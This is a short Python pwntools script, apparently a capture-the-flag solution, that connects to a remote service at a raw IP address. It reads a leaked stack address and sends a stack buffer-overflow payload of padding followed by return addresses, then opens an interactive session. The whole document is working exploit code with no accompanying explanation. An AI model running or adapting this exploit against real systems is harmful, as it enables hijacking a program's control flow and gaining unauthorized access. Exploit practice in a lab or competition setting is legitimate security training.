from pwn import *

# p = process('./pwn5')
p = remote('3.1.32.51', 8003)

# gdb.attach(p)

p.recvuntil(b'stack: ')
leak = int(p.recvline().strip(), 16)
print(hex(leak))

payload = b'A'*0x48
payload += p64(leak)
payload += p64(0x40101a)
payload += p64(0x401222)

p.sendline(payload)

p.interactive()